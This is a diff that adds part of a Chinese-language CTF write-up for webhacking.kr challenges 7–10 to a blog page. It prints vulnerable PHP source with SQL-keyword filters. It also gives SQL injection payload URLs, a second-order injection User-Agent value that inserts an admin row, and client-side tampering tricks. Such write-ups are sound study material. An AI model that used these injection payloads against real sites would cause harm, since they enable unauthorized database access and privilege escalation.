@@ -279,6 +279,197 @@
 <span class="k">print</span> <span class="n">a</span>
 </code></pre></div></div>
 
+<h2 id="challenge-7-️">challenge 7 ⭐️</h2>
+
+<p><strong>tips:</strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>index.phps
+</code></pre></div></div>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?</span>
+<span class="nv">$answer</span> <span class="o">=</span> <span class="s2">"????"</span><span class="p">;</span>
+
+<span class="nv">$go</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">val</span><span class="p">];</span>
+
+<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$go</span><span class="p">)</span> <span class="p">{</span> <span class="k">echo</span><span class="p">(</span><span class="s2">"&lt;meta http-equiv=refresh content=0;url=index.php?val=1&gt;"</span><span class="p">);</span> <span class="p">}</span>
+
+<span class="nv">$ck</span><span class="o">=</span><span class="nv">$go</span><span class="p">;</span>
+
+<span class="nv">$ck</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">"*"</span><span class="p">,</span><span class="s2">""</span><span class="p">,</span><span class="nv">$ck</span><span class="p">);</span>
+<span class="nv">$ck</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">"/"</span><span class="p">,</span><span class="s2">""</span><span class="p">,</span><span class="nv">$ck</span><span class="p">);</span>
+
+
+<span class="k">echo</span><span class="p">(</span><span class="s2">"&lt;html&gt;&lt;head&gt;&lt;title&gt;admin page&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor='black'&gt;&lt;font size=2 color=gray&gt;&lt;b&gt;&lt;h3&gt;Admin page&lt;/h3&gt;&lt;/b&gt;&lt;p&gt;"</span><span class="p">);</span>
+
+
+<span class="k">if</span><span class="p">(</span><span class="nb">eregi</span><span class="p">(</span><span class="s2">"--|2|50|\+|substring|from|infor|mation|lv|%20|=|!|&lt;&gt;|sysM|and|or|table|column"</span><span class="p">,</span><span class="nv">$ck</span><span class="p">))</span> <span class="k">exit</span><span class="p">(</span><span class="s2">"Access Denied!"</span><span class="p">);</span>
+
+<span class="k">if</span><span class="p">(</span><span class="nb">eregi</span><span class="p">(</span><span class="s1">' '</span><span class="p">,</span><span class="nv">$ck</span><span class="p">))</span> <span class="p">{</span> <span class="k">echo</span><span class="p">(</span><span class="s1">'cannot use space'</span><span class="p">);</span> <span class="k">exit</span><span class="p">();</span> <span class="p">}</span>
+
+<span class="nv">$rand</span><span class="o">=</span><span class="nb">rand</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">5</span><span class="p">);</span>
+
+<span class="k">if</span><span class="p">(</span><span class="nv">$rand</span><span class="o">==</span><span class="mi">1</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="nv">$result</span><span class="o">=@</span><span class="nb">mysql_query</span><span class="p">(</span><span class="s2">"select lv from lv1 where lv=(</span><span class="nv">$go</span><span class="s2">)"</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">"nice try!"</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">if</span><span class="p">(</span><span class="nv">$rand</span><span class="o">==</span><span class="mi">2</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="nv">$result</span><span class="o">=@</span><span class="nb">mysql_query</span><span class="p">(</span><span class="s2">"select lv from lv1 where lv=((</span><span class="nv">$go</span><span class="s2">))"</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">"nice try!"</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">if</span><span class="p">(</span><span class="nv">$rand</span><span class="o">==</span><span class="mi">3</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="nv">$result</span><span class="o">=@</span><span class="nb">mysql_query</span><span class="p">(</span><span class="s2">"select lv from lv1 where lv=(((</span><span class="nv">$go</span><span class="s2">)))"</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">"nice try!"</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">if</span><span class="p">(</span><span class="nv">$rand</span><span class="o">==</span><span class="mi">4</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="nv">$result</span><span class="o">=@</span><span class="nb">mysql_query</span><span class="p">(</span><span class="s2">"select lv from lv1 where lv=((((</span><span class="nv">$go</span><span class="s2">))))"</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">"nice try!"</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">if</span><span class="p">(</span><span class="nv">$rand</span><span class="o">==</span><span class="mi">5</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="nv">$result</span><span class="o">=@</span><span class="nb">mysql_query</span><span class="p">(</span><span class="s2">"select lv from lv1 where lv=(((((</span><span class="nv">$go</span><span class="s2">)))))"</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">"nice try!"</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="nv">$data</span><span class="o">=</span><span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
+<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$data</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="p">{</span> <span class="k">echo</span><span class="p">(</span><span class="s2">"query error"</span><span class="p">);</span> <span class="k">exit</span><span class="p">();</span> <span class="p">}</span>
+<span class="k">if</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">!=</span><span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="nv">$data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">!=</span><span class="mi">2</span><span class="p">)</span> <span class="p">{</span> <span class="k">exit</span><span class="p">();</span> <span class="p">}</span>
+
+
+<span class="k">if</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">==</span><span class="mi">1</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="k">echo</span><span class="p">(</span><span class="s2">"&lt;input type=button style=border:0;bgcolor='gray' value='auth' onclick=
+alert('Access_Denied!')&gt;&lt;p&gt;"</span><span class="p">);</span>
+<span class="k">echo</span><span class="p">(</span><span class="s2">"&lt;!-- admin mode : val=2 --&gt;"</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">if</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">==</span><span class="mi">2</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="k">echo</span><span class="p">(</span><span class="s2">"&lt;input type=button style=border:0;bgcolor='gray' value='auth' onclick=
+alert('Congratulation')&gt;&lt;p&gt;"</span><span class="p">);</span>
+<span class="o">@</span><span class="nx">solve</span><span class="p">();</span>
+<span class="p">}</span> 
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>主要注意下面的代码</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ck</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">"*"</span><span class="p">,</span><span class="s2">""</span><span class="p">,</span><span class="nv">$ck</span><span class="p">);</span>
+<span class="nv">$ck</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">"/"</span><span class="p">,</span><span class="s2">""</span><span class="p">,</span><span class="nv">$ck</span><span class="p">);</span>
+<span class="o">.</span>
+<span class="o">.</span>
+<span class="o">.</span>
+<span class="k">if</span><span class="p">(</span><span class="nb">eregi</span><span class="p">(</span><span class="s2">"--|2|50|\+|substring|from|infor|mation|lv|%20|=|!|&lt;&gt;|sysM|and|or|table|column"</span><span class="p">,</span><span class="nv">$ck</span><span class="p">))</span> <span class="k">exit</span><span class="p">(</span><span class="s2">"Access Denied!"</span><span class="p">);</span>
+<span class="k">if</span><span class="p">(</span><span class="nb">eregi</span><span class="p">(</span><span class="s1">' '</span><span class="p">,</span><span class="nv">$ck</span><span class="p">))</span> <span class="p">{</span> <span class="k">echo</span><span class="p">(</span><span class="s1">'cannot use space'</span><span class="p">);</span> <span class="k">exit</span><span class="p">();</span> <span class="p">}</span>
+</code></pre></div></div>
+
+<p><strong>payload:</strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://webhacking.kr/challenge/web/web-07/index.php?val=0)%0au*ni*on%0ase*le*ct%0a(3-1
+http://webhacking.kr/challenge/web/web-07/index.php?val=0)%0aunion%select%0a3-1%23
+</code></pre></div></div>
+
+<p>以上payload尝试失败遇到mod_security ⭐️</p>
+
+<h2 id="challenge-8">challenge 8</h2>
+
+<p>查看源码</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?</span>
+
+<span class="nv">$agent</span><span class="o">=</span><span class="nb">getenv</span><span class="p">(</span><span class="s2">"HTTP_USER_AGENT"</span><span class="p">);</span>
+<span class="nv">$ip</span><span class="o">=</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="nx">REMOTE_ADDR</span><span class="p">];</span>
+
+<span class="nv">$agent</span><span class="o">=</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$agent</span><span class="p">);</span>
+
+<span class="nv">$agent</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">"."</span><span class="p">,</span><span class="s2">"_"</span><span class="p">,</span><span class="nv">$agent</span><span class="p">);</span>
+<span class="nv">$agent</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">"/"</span><span class="p">,</span><span class="s2">"_"</span><span class="p">,</span><span class="nv">$agent</span><span class="p">);</span>
+
+<span class="nv">$pat</span><span class="o">=</span><span class="s2">"/\/|\*|union|char|ascii|select|out|infor|schema|columns|sub|-|\+|\||!|update|del|drop|from|where|order|by|asc|desc|lv|board|\([0-9]|sys|pass|\.|like|and|\'\'|sub/"</span><span class="p">;</span>
+
+<span class="c1">//这里没有对单引号进行过滤且后面插入的时候会用到
+</span><span class="nv">$agent</span><span class="o">=</span><span class="nb">strtolower</span><span class="p">(</span><span class="nv">$agent</span><span class="p">);</span>
+
+<span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="nv">$pat</span><span class="p">,</span><span class="nv">$agent</span><span class="p">))</span> <span class="k">exit</span><span class="p">(</span><span class="s2">"Access Denied!"</span><span class="p">);</span>
+
+<span class="c1">//这里对单引号进行了过滤但是只是在查询的时候用到
+</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="nx">HTTP_USER_AGENT</span><span class="p">]</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">"'"</span><span class="p">,</span><span class="s2">""</span><span class="p">,</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="nx">HTTP_USER_AGENT</span><span class="p">]);</span>
+<span class="nv">$_SERVER</span><span class="p">[</span><span class="nx">HTTP_USER_AGENT</span><span class="p">]</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">"</span><span class="se">\"</span><span class="s2">"</span><span class="p">,</span><span class="s2">""</span><span class="p">,</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="nx">HTTP_USER_AGENT</span><span class="p">]);</span>
+
+<span class="nv">$count_ck</span><span class="o">=@</span><span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nb">mysql_query</span><span class="p">(</span><span class="s2">"select count(id) from lv0"</span><span class="p">));</span>
+<span class="k">if</span><span class="p">(</span><span class="nv">$count_ck</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">&gt;=</span><span class="mi">70</span><span class="p">)</span> <span class="p">{</span> <span class="o">@</span><span class="nb">mysql_query</span><span class="p">(</span><span class="s2">"delete from lv0"</span><span class="p">);</span> <span class="p">}</span>
+
+
+<span class="nv">$q</span><span class="o">=@</span><span class="nb">mysql_query</span><span class="p">(</span><span class="s2">"select id from lv0 where agent='</span><span class="nv">$_SERVER[HTTP_USER_AGENT]</span><span class="s2">'"</span><span class="p">);</span>
+
+<span class="nv">$ck</span><span class="o">=@</span><span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$q</span><span class="p">);</span>
+
+<span class="k">if</span><span class="p">(</span><span class="nv">$ck</span><span class="p">)</span>
+<span class="p">{</span> 
+<span class="k">echo</span><span class="p">(</span><span class="s2">"hi &lt;b&gt;</span><span class="nv">$ck[0]</span><span class="s2">&lt;/b&gt;&lt;p&gt;"</span><span class="p">);</span>
+<span class="k">if</span><span class="p">(</span><span class="nv">$ck</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">==</span><span class="s2">"admin"</span><span class="p">)</span>
+
+<span class="p">{</span>
+<span class="o">@</span><span class="nx">solve</span><span class="p">();</span>
+<span class="o">@</span><span class="nb">mysql_query</span><span class="p">(</span><span class="s2">"delete from lv0"</span><span class="p">);</span>
+<span class="p">}</span>
+
+
+<span class="p">}</span>
+
+<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$ck</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="nv">$q</span><span class="o">=@</span><span class="nb">mysql_query</span><span class="p">(</span><span class="s2">"insert into lv0(agent,ip,id) values('</span><span class="nv">$agent</span><span class="s2">','</span><span class="nv">$ip</span><span class="s2">','guest')"</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">"query error"</span><span class="p">);</span>
+<span class="k">echo</span><span class="p">(</span><span class="s2">"&lt;br&gt;&lt;br&gt;done!  (</span><span class="nv">$count_ck[0]</span><span class="s2">/70)"</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>这里考查的是比较基础的二次注入</p>
+
+<p><strong>payload:</strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>第一次
+insert into lv0(agent,ip,id) values('$agent','$ip','guest')
+User-Agent: admin','1','admin')#
+第二次
+User-Agent: admin
+</code></pre></div></div>
+
+<h2 id="challenge-9">challenge 9</h2>
+
+<h2 id="challenge-10">challenge 10</h2>
+
+<p>查看源码</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;a</span> <span class="na">id=</span><span class="s">hackme</span> <span class="na">style=</span><span class="s">"position:relative;left:0;top:0"</span> <span class="na">onclick=</span><span class="s">"this.style.posLeft+=1;if(this.style.posLeft==800)this.href='?go='+this.style.posLeft"</span> <span class="na">onmouseover=</span><span class="s">this.innerHTML='yOu'</span> <span class="na">onmouseout=</span><span class="s">this.innerHTML='O'</span><span class="nt">&gt;</span>O<span class="nt">&lt;/a&gt;&lt;br&gt;</span>
+</code></pre></div></div>
+
+<p>根据 JS 代码，使用下面 URL</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://webhacking.kr/challenge/codeing/code1.html?go=800
+</code></pre></div></div>
+
+<p>发现并没有什么异常，返回<code class="highlighter-rouge">no hack</code></p>
+
+<p>这里有两种方法：</p>
+
+<p><strong>解法一:</strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hackme.style.posLeft=799
+</code></pre></div></div>
+
+<p>然后点击 <code class="highlighter-rouge">a</code> 标签</p>
+
+<p><strong>解法二:</strong></p>
+
+<p>抓包，然后添加</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Referer: http://webhacking.kr/challenge/codeing/code1.html
+</code></pre></div></div>
+
 <h2 id="参考">参考:</h2>
 
 <p><a href="http://shaobaobaoer.cn/archives/654/hackingweb-kr-81e998aee595">http://shaobaobaoer.cn/archives/654/hackingweb-kr-81e998aee595</a></p>
